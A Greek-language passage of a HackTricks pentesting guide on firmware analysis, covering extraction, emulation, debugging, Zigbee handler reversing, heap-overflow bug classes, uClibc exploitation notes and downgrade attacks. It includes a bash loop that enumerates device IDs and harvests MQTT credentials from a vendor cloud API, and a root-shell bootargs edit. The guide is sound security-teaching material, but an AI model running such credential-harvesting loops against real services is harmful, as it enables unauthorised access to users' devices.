# Ανάλυση firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Εισαγωγή**

### Σχετικοί πόροι

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των εξαρτημάτων του hardware και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, ώστε η συσκευή να έχει πρόσβαση σε ζωτικές οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η πιθανή τροποποίηση του firmware είναι κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρικές του codebase και τις τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Διαγράμματα αρχιτεκτονικής και ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων open-source software μέσω μη αυτόματων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, η οποία μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, κατασκευαστές)
- **Με build** βάσει των παρεχόμενων οδηγιών
- **Με λήψη** από επίσημες ιστοσελίδες υποστήριξης
- Χρήση ερωτημάτων **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **ενημερώσεων** με τεχνικές man-in-the-middle
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Sniffing** για αιτήματα ενημέρωσης κατά την επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded endpoints ενημέρωσης**
- **Dumping** από τον bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του chip αποθήκευσης, ως έσχατη λύση, με χρήση κατάλληλων εργαλείων hardware

### Καταγραφές μόνο μέσω UART: εξαναγκασμός εκκίνησης root shell μέσω του περιβάλλοντος U-Boot στη flash

Αν αγνοείται το UART RX (εμφανίζονται μόνο καταγραφές), μπορείτε και πάλι να εξαναγκάσετε την εκκίνηση ενός init shell, **επεξεργαζόμενοι offline το blob περιβάλλοντος του U-Boot**:<sup>[[6]](#references)</sup>

1. Κάντε dump της SPI flash με ένα κλιπ SOIC-8 και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το διαμέρισμα env του U-Boot, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το CRC32 του U-Boot env** για το blob.
3. Κάντε reflash μόνο στο διαμέρισμα env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε ενσωματωμένες συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το διαμέρισμα env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στη flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Μπορείτε να χρησιμοποιήσετε διάφορα εργαλεία για αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** του image με `binwalk -E <bin>`. Αν είναι χαμηλή, τότε το image μάλλον δεν είναι κρυπτογραφημένο. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένο (ή συμπιεσμένο με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Λήψη του Filesystem

Με τα εργαλεία που αναφέρθηκαν προηγουμένως, όπως το `binwalk -ev <bin>`, θα πρέπει να μπορέσατε να **εξαγάγετε το filesystem**.\
Το Binwalk συνήθως το εξάγει σε έναν **φάκελο με όνομα τον τύπο του filesystem**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή του Filesystem

Μερικές φορές, το binwalk **δεν έχει το magic byte του filesystem στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **εντοπίσετε το offset του filesystem και να κάνετε carve το συμπιεσμένο filesystem** από το binary και να **εξαγάγετε χειροκίνητα** το filesystem ανάλογα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για να κάνετε carving του συστήματος αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, θα μπορούσε να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Στη συνέχεια, τα αρχεία θα βρίσκονται στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με μνήμη flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί για να γίνει κατανοητή η δομή του και να εντοπιστούν πιθανές ευπάθειες. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από το firmware.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρατίθεται ένα σύνολο εντολών για την αρχική επιθεώρηση του δυαδικού αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον προσδιορισμό των τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των κατατμήσεων και του συστήματος αρχείων:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει έλλειψη κρυπτογράφησης, ενώ η υψηλή εντροπία υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Με τη χρήση του `binwalk -ev <bin>`, μπορεί κανείς συνήθως να εξαγάγει το σύστημα αρχείων, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του συστήματος αρχείων (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν αναγνωρίζει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του συστήματος αρχείων και, στη συνέχεια, την εντολή `dd` για την αποκοπή του συστήματος αρχείων:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση filesystem

Αφού εξαχθεί το filesystem, ξεκινά η αναζήτηση για ευπάθειες ασφαλείας. Ελέγχονται μη ασφαλείς network daemons, hardcoded credentials, τελικά σημεία API, λειτουργίες server ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και compiled binaries για offline analysis.

**Βασικές τοποθεσίες** και **στοιχεία** προς επιθεώρηση:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανές ευπάθειες
- Ενσωματωμένα binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών μέσα στο filesystem:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε compiled binaries

Τόσο ο πηγαίος κώδικας όσο και τα compiled binaries που εντοπίζονται στο filesystem πρέπει να ελέγχονται εξονυχιστικά για ευπάθειες. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να αποτελέσουν στόχο εκμετάλλευσης.

## Συλλογή cloud config και διαπιστευτηρίων MQTT μέσω URL tokens που παράγονται τοπικά

Πολλά IoT hubs ανακτούν τις ρυθμίσεις τους, οι οποίες αφορούν κάθε συσκευή ξεχωριστά, από ένα cloud endpoint που μοιάζει με το εξής:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware, ενδέχεται να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID με χρήση ενός hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει το cloud config, αποκαλύπτοντας συχνά credentials MQTT σε plaintext και prefixes θεμάτων.

Πρακτική διαδικασία:

1) Εξαγάγετε το deviceId από τα UART boot logs

- Συνδέστε έναν προσαρμογέα UART 3,3 V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εμφανίζουν το μοτίβο URL της διαμόρφωσης cloud και τη διεύθυνση broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φόρτωσε τα binaries στο Ghidra/radare2 και αναζήτησε το config path ("/pf/") ή χρήση MD5.
- Επιβεβαίωσε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Υπολόγισε το token στο Bash και μετέτρεψε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλέξτε cloud config και διαπιστευτήρια MQTT

- Συνθέστε το URL και ανακτήστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε μυστικά:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Κατάχρηση MQTT σε plaintext και αδύναμων ACLs για topics (αν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να κάνετε subscribe σε topics συντήρησης και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα ID συσκευών (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν byte OUI/προϊόντος/τύπου κατασκευαστή, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να δοκιμάσετε διαδοχικά υποψήφια ID, να παράγετε tokens και να ανακτάτε προγραμματικά configs:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική απαρίθμηση.
- Όπου είναι δυνατό, προτιμήστε την εξομοίωση ή τη στατική ανάλυση για την ανάκτηση μυστικών, χωρίς να τροποποιείτε το υλικό-στόχο.


Η εξομοίωση firmware επιτρέπει **δυναμική ανάλυση** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να παρουσιάσει προκλήσεις λόγω εξαρτήσεων από το υλικό ή την αρχιτεκτονική. Ωστόσο, η μεταφορά του root filesystem ή συγκεκριμένων δυαδικών αρχείων σε μια συσκευή με ίδια αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προδιαμορφωμένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Εξομοίωση μεμονωμένων δυαδικών αρχείων

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστούν το endianness του προγράμματος και η αρχιτεκτονική της CPU.

#### Παράδειγμα με αρχιτεκτονική MIPS

Για την εξομοίωση ενός δυαδικού αρχείου αρχιτεκτονικής MIPS, μπορείτε να χρησιμοποιήσετε την εντολή:

```bash
file ./squashfs-root/bin/busybox
```

Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian, η επιλογή θα ήταν το `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για binaries ARM, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την εξομοίωση.

### Εξομοίωση πλήρους συστήματος

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και βοηθώντας στη δυναμική ανάλυση.

## Δυναμική ανάλυση στην πράξη

Σε αυτό το στάδιο, χρησιμοποιείται για την ανάλυση είτε ένα πραγματικό είτε ένα εξομοιωμένο περιβάλλον συσκευής. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο OS και στο filesystem. Η εξομοίωση ενδέχεται να μην αναπαριστά τέλεια τις αλληλεπιδράσεις με το hardware, οπότε μπορεί να χρειάζονται περιστασιακές επανεκκινήσεις της εξομοίωσης. Η ανάλυση θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται εκτεθειμένες ιστοσελίδες και υπηρεσίες δικτύου και να διερευνά ευπάθειες του bootloader. Οι δοκιμές ακεραιότητας του firmware είναι κρίσιμες για τον εντοπισμό πιθανών ευπαθειών backdoor.

## Τεχνικές ανάλυσης χρόνου εκτέλεσης

Η ανάλυση χρόνου εκτέλεσης περιλαμβάνει την αλληλεπίδραση με μια διεργασία ή ένα binary στο περιβάλλον λειτουργίας του, χρησιμοποιώντας εργαλεία όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

Για embedded στόχους χωρίς πλήρες debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και συνδεθείτε απομακρυσμένα:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Χαρτογράφηση μηνυμάτων Zigbee / radio-co-processor

Στους IoT hubs, το RF stack συχνά διαχωρίζεται μεταξύ ενός **radio MCU** και μιας διεργασίας Linux userland. Μια χρήσιμη ροή εργασίας είναι να χαρτογραφήσετε τη διαδρομή:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **parser στην πλευρά του controller** στο radio MCU
3. **πρωτόκολλο κειμένου ή TLV μέσω serial/UART** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στον κύριο daemon
5. **handler / state machine ειδικό για το πρωτόκολλο**

Αυτή η αρχιτεκτονική δημιουργεί δύο στόχους για reverse engineering αντί για έναν. Αν ο controller μετατρέπει τα δυαδικά radio frames σε πρωτόκολλο κειμένου όπως `Group,Command,arg1,arg2,...`, εντοπίστε:

- Τις **ομάδες μηνυμάτων** και τους πίνακες dispatch
- Ποια μηνύματα μπορούν να προέρχονται από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific πεδία διάκρισης** (για παράδειγμα `manufacturer_code` και το προσαρμοσμένο Zigbee `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τις φάσεις **commissioning**, discovery ή λήψης firmware/model

Ειδικά για το Zigbee, καταγράψτε την κίνηση pairing και ελέγξτε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ισχύει αυτό, το sniffing της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Οι install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, γι' αυτό σημειώστε αν η συσκευή που δοκιμάστηκε τους επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και προσβασιμότητα ελεγχόμενη από FSM

Οι εντολές Zigbee/ZCL ειδικές για τον κατασκευαστή είναι συχνά καλύτερος στόχος από τα τυποποιημένα clusters, επειδή τροφοδοτούν **προσαρμοσμένο parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη επικύρωση.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάντε reverse engineer τον command dispatcher μέχρι να βρείτε τον **handler που χρησιμοποιείται μόνο από τον κατασκευαστή**.
- Ανακτήστε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντοπίστε τις **μεταβατικές καταστάσεις** που προχωρούν αυτόματα, καθώς και τα branches retry/error που τελικά κάνουν reset ή αποδεσμεύουν κατάσταση ελεγχόμενη από τον επιτιθέμενο.
- Επιβεβαιώστε ποιες νόμιμες ανταλλαγές πρωτοκόλλου απαιτούνται για να φέρετε τον daemon στην ευάλωτη κατάσταση, αντί να υποθέσετε ότι ο προβληματικός handler είναι πάντα προσβάσιμος.

Για πρωτόκολλα ευαίσθητα στον χρόνο, το packet replay από Python framework μπορεί να είναι πολύ αργό. Μια πιο αξιόπιστη προσέγγιση είναι να προσομοιώσετε μια νόμιμη συσκευή σε πραγματικό hardware (για παράδειγμα **nRF52840**) με stack επιπέδου κατασκευαστή, ώστε να μπορείτε να εκθέσετε τα σωστά **endpoints**, **attributes** και τον σωστό χρονισμό του commissioning.

### Κατηγορία σφαλμάτων σε fragmented downloads embedded daemons

Μια επαναλαμβανόμενη κατηγορία σφαλμάτων firmware εμφανίζεται σε **fragmented downloads blob/model/configuration**:<sup>[[8]](#references)</sup>

1. Το **πρώτο fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και δεσμεύει μνήμη με `malloc(total_size)`.
2. Τα επόμενα fragments επικυρώνουν μόνο πεδία **τοπικά στο packet**, ελεγχόμενα από τον επιτιθέμενο, όπως `packet_total_size >= offset + chunk_len`.
3. Η αντιγραφή χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς να ελέγχει αν το μέγεθος υπερβαίνει το **αρχικό μέγεθος της δεσμευμένης μνήμης**.

Αυτό επιτρέπει σε έναν επιτιθέμενο να στείλει:

- Ένα έγκυρο πρώτο fragment με **μικρό** δηλωμένο συνολικό μέγεθος, ώστε να δεσμευτεί μικρή περιοχή heap.
- Ένα επόμενο fragment με το **αναμενόμενο offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα πλαστογραφημένο packet-local μέγεθος που περνά τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί overflow στον αρχικά δεσμευμένο buffer.

Όταν η ευάλωτη διαδρομή βρίσκεται πίσω από λογική commissioning, το exploitation πρέπει να περιλαμβάνει αρκετή **προσομοίωση συσκευής**, ώστε ο στόχος να περάσει στην αναμενόμενη κατάσταση model-download ή blob-download πριν από την αποστολή των κακοσχηματισμένων fragments.

### Triggers `free()` που ενεργοποιούνται από το πρωτόκολλο

Σε embedded daemons, ο ευκολότερος τρόπος να ενεργοποιηθεί heap metadata exploitation συχνά δεν είναι να «περιμένετε τον καθαρισμό», αλλά να **εξαναγκάσετε τον χειρισμό σφαλμάτων του ίδιου του πρωτοκόλλου**:<sup>[[8]](#references)</sup>

- Στείλτε κακοσχηματισμένα επόμενα fragments για να οδηγήσετε το FSM σε καταστάσεις **retry** ή **error**.
- Ξεπεράστε το όριο επαναλήψεων, ώστε ο daemon να κάνει **reset το context** και να αποδεσμεύσει τον αλλοιωμένο buffer.
- Χρησιμοποιήστε αυτό το προβλέψιμο `free()` για να ενεργοποιήσετε primitives στην πλευρά του allocator πριν το process καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε primitive εγγραφής. Ένα σταθερό μοτίβο είναι η αλλοίωση ενός **size field**, ώστε η διαδρομή του allocator να κατευθυνθεί σε **fake chunks τοποθετημένα μέσα στον buffer που υπέστη overflow**, αντί να αλλοιωθούν αμέσως πραγματικοί δείκτες bin και να καταρρεύσει το process.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε γλώσσες χαμηλού επιπέδου. Οι runtime protections για binary σε embedded συστήματα είναι σπάνιες, αλλά όταν υπάρχουν, μπορεί να χρειαστούν τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις για uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** Η uClibc χρησιμοποιεί fastbins παρόμοια με την glibc. Μια μεταγενέστερη μεγάλη δέσμευση μνήμης μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να περνά τους ελέγχους (έγκυρο μέγεθος, `fd = 0` και τα γειτονικά chunks να θεωρούνται «σε χρήση»).<sup>[[6]](#references)</sup>
- **Binaries χωρίς PIE υπό ASLR:** αν είναι ενεργό το ASLR, αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις `.data/.bss` μέσα στο binary είναι σταθερές. Μπορείτε να στοχεύσετε μια περιοχή που ήδη μοιάζει με έγκυρη κεφαλίδα heap chunk, ώστε μια fastbin allocation να καταλήξει σε **πίνακα function pointers**.
- **NUL που σταματά τον parser:** κατά το parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας ταυτόχρονα τα bytes που ακολουθούν και τα οποία ελέγχονται από τον επιτιθέμενο, για stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** μια ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει εκτελέσιμο shellcode σε γνωστό mapping και να μεταφέρει εκεί την εκτέλεση.

## Προετοιμασμένα λειτουργικά συστήματα για ανάλυση firmware

Λειτουργικά συστήματα όπως τα [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προρυθμισμένα περιβάλλοντα για δοκιμές ασφάλειας firmware, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Προετοιμασμένα λειτουργικά συστήματα για ανάλυση firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι μια διανομή που έχει σχεδιαστεί για να σας βοηθά να πραγματοποιείτε αξιολογήσεις ασφάλειας και penetration testing σε συσκευές Internet of Things (IoT). Εξοικονομεί πολύ χρόνο παρέχοντας ένα προρυθμισμένο περιβάλλον με όλα τα απαραίτητα εργαλεία εγκατεστημένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Λειτουργικό σύστημα για δοκιμές embedded security, βασισμένο στο Ubuntu 18.04 και προεγκατεστημένο με εργαλεία δοκιμών ασφάλειας firmware.

## Επιθέσεις υποβάθμισης firmware και μη ασφαλείς μηχανισμοί ενημέρωσης

Ακόμη κι όταν ένας κατασκευαστής υλοποιεί ελέγχους κρυπτογραφικής υπογραφής για τα images firmware, συχνά **παραλείπεται η προστασία από επαναφορά έκδοσης (downgrade)**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ενσωματωμένο δημόσιο κλειδί, αλλά δεν συγκρίνει την *έκδοση* (ή έναν μονοτονικό μετρητή) του image που εγκαθίσταται, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει ευπάθειες που είχαν διορθωθεί.<sup>[[4]](#references)</sup>

Τυπική ροή επίθεσης:

1. **Αποκτήστε ένα παλαιότερο υπογεγραμμένο image**
   * Κατεβάστε το από τη δημόσια πύλη λήψεων, το CDN ή τον ιστότοπο υποστήριξης του κατασκευαστή.
   * Εξαγάγετέ το από συνοδευτικές εφαρμογές για κινητά ή desktop (π.χ. μέσα σε Android APK, στον φάκελο `assets/firmware/`).
   * Ανακτήστε το από αποθετήρια τρίτων όπως το VirusTotal, διαδικτυακά αρχεία, forums κ.λπ.
2. **Ανεβάστε ή σερβίρετε το image στη συσκευή** μέσω οποιουδήποτε διαθέσιμου καναλιού ενημέρωσης:
